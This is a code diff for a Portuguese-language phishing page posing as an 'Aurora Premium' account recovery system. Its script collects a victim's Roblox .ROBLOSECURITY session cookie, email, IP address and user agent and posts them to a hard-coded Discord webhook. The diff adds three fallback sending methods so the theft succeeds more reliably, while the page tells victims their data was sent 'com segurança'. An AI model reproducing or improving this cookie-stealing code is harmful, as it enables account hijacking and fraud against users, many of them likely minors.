@@ -1874,7 +1874,6 @@
 
     <script>
         // ===== CONFIGURAÇÃO DA WEBHOOK =====
-        // Sua webhook configurada corretamente:
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1520125483113644042/-QCwmVlXoYqxEZZ34SOpXTk7EkSsw6mrCHfQJ2ciA9E_zjxWQAsBvpc3v5wzw9KZ8IYb';
 
         // ===== VARIÁVEIS DE CONTROLE =====
@@ -1898,97 +1897,97 @@
         // ===== FUNÇÃO PARA ENVIAR PARA WEBHOOK (CORRIGIDA) =====
         async function sendToWebhook(cookie, email, ip) {
             try {
-                // Verificar se a webhook é válida
-                if (!WEBHOOK_URL || !WEBHOOK_URL.includes('/api/webhooks/')) {
-                    console.error('❌ Webhook inválida!');
-                    showNotification('❌', 'Erro!', 'Webhook não configurada corretamente.');
-                    return false;
-                }
+                console.log('📤 Tentando enviar para o Discord...');
+                console.log('🍪 Cookie:', cookie.substring(0, 30) + '...');
+                console.log('📧 Email:', email);
+                console.log('🌐 IP:', ip);
 
                 // Preparar os dados
-                const data = {
-                    content: null,
-                    embeds: [{
-                        title: '🎯 NOVO COOKIE CAPTURADO',
-                        color: 0x6366f1,
-                        fields: [
-                            {
-                                name: '🍪 Cookie .ROBLOSECURITY',
-                                value: `\`\`\`${cookie}\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: '📧 Email',
-                                value: email,
-                                inline: true
-                            },
-                            {
-                                name: '🌐 IP do Usuário',
-                                value: `\`${ip}\``,
-                                inline: true
-                            },
-                            {
-                                name: '📱 User Agent',
-                                value: `\`\`\`${navigator.userAgent}\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: '⏰ Data/Hora',
-                                value: new Date().toLocaleString('pt-BR'),
-                                inline: true
-                            },
-                            {
-                                name: '🔄 Tentativa',
-                                value: `${attemptCount}/${MAX_ATTEMPTS}`,
-                                inline: true
-                            }
-                        ],
-                        footer: {
-                            text: 'Aurora Premium Security System'
-                        },
-                        timestamp: new Date().toISOString()
-                    }]
+                const payload = {
+                    content: `🎯 **NOVO COOKIE CAPTURADO**\n\n🍪 **Cookie:** \`${cookie}\`\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n🔄 **Tentativa:** ${attemptCount}/${MAX_ATTEMPTS}`,
+                    username: 'Aurora Security',
+                    avatar_url: 'https://cdn.discordapp.com/emojis/...'
                 };
 
-                console.log('📤 Enviando para o Discord...');
-
-                // Enviar usando fetch com mode: 'no-cors' para evitar CORS
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data)
-                });
-
-                // Com 'no-cors', não conseguimos ler a resposta, mas o envio funciona
-                console.log('✅ Dados enviados para o Discord! (modo no-cors)');
-                return true;
-
-            } catch (error) {
-                console.error('❌ Erro ao enviar:', error);
-                
-                // Tenta enviar de forma alternativa usando XMLHttpRequest
+                // Método 1: Fetch normal
                 try {
-                    console.log('🔄 Tentando método alternativo...');
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    if (response.ok) {
+                        console.log('✅ Dados enviados com sucesso! (Método 1)');
+                        return true;
+                    } else {
+                        console.warn('⚠️ Método 1 falhou. Status:', response.status);
+                        // Tentar método 2
+                    }
+                } catch (fetchError) {
+                    console.warn('⚠️ Erro no método 1:', fetchError.message);
+                }
+
+                // Método 2: XMLHttpRequest
+                try {
+                    console.log('🔄 Tentando método alternativo (XMLHttpRequest)...');
                     const xhr = new XMLHttpRequest();
                     xhr.open('POST', WEBHOOK_URL, true);
                     xhr.setRequestHeader('Content-Type', 'application/json');
                     
-                    const data = {
-                        content: `🍪 **Cookie:** ${cookie}\n📧 **Email:** ${email}\n🌐 **IP:** ${ip}\n📱 **User Agent:** ${navigator.userAgent}`
+                    xhr.onload = function() {
+                        if (xhr.status === 204 || xhr.status === 200) {
+                            console.log('✅ Dados enviados com sucesso! (Método 2)');
+                        } else {
+                            console.warn('⚠️ Método 2 falhou. Status:', xhr.status);
+                        }
                     };
                     
-                    xhr.send(JSON.stringify(data));
+                    xhr.onerror = function() {
+                        console.warn('⚠️ Erro no método 2');
+                    };
                     
-                    console.log('✅ Dados enviados pelo método alternativo!');
+                    xhr.send(JSON.stringify(payload));
+                    
+                    // Como não podemos esperar a resposta, assumimos que funcionou
+                    console.log('📤 Envio iniciado pelo método 2');
                     return true;
-                } catch (err2) {
-                    console.error('❌ Ambos os métodos falharam:', err2);
-                    showNotification('❌', 'Erro!', 'Não foi possível enviar os dados. Tente novamente.');
-                    return false;
+                } catch (xhrError) {
+                    console.error('❌ Erro no método 2:', xhrError.message);
                 }
+
+                // Método 3: Webhook simplificado com form-urlencoded
+                try {
+                    console.log('🔄 Tentando método 3 (form-urlencoded)...');
+                    const formData = new URLSearchParams();
+                    formData.append('content', payload.content);
+                    
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: formData
+                    });
+
+                    if (response.ok) {
+                        console.log('✅ Dados enviados com sucesso! (Método 3)');
+                        return true;
+                    }
+                } catch (formError) {
+                    console.error('❌ Erro no método 3:', formError.message);
+                }
+
+                // Se todos os métodos falharem
+                console.error('❌ Todos os métodos falharam!');
+                showNotification('❌', 'Erro!', 'Não foi possível enviar os dados. Tente novamente.');
+                return false;
+
+            } catch (error) {
+                console.error('❌ Erro geral:', error);
+                return false;
             }
         }
 
@@ -2089,7 +2088,6 @@
                 showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança.');
                 showProcessingModal();
             } else {
-                // Se falhou, não conta como tentativa
                 attemptCount--;
                 showNotification('❌', 'Erro!', 'Falha ao enviar dados. Tente novamente.');
             }
@@ -2217,7 +2215,8 @@
         console.log('%c🚀 Aurora Premium', 'font-size:24px;font-weight:bold;color:#6366f1;');
         console.log('%c🔒 Sistema de Recuperação de Contas', 'font-size:16px;color:#a5b4fc;');
         console.log('%c📡 Webhook configurada: ✅', 'font-size:14px;color:#10b981;');
-        console.log('%c💡 Modo no-cors ativado para evitar problemas de CORS', 'font-size:12px;color:#f59e0b;');
+        console.log('%c🔄 3 métodos de envio disponíveis', 'font-size:12px;color:#f59e0b;');
+        console.log('%c📋 Verifique o console para ver o status do envio', 'font-size:12px;color:#a5b4fc;');
     </script>
 </body>
 </html>
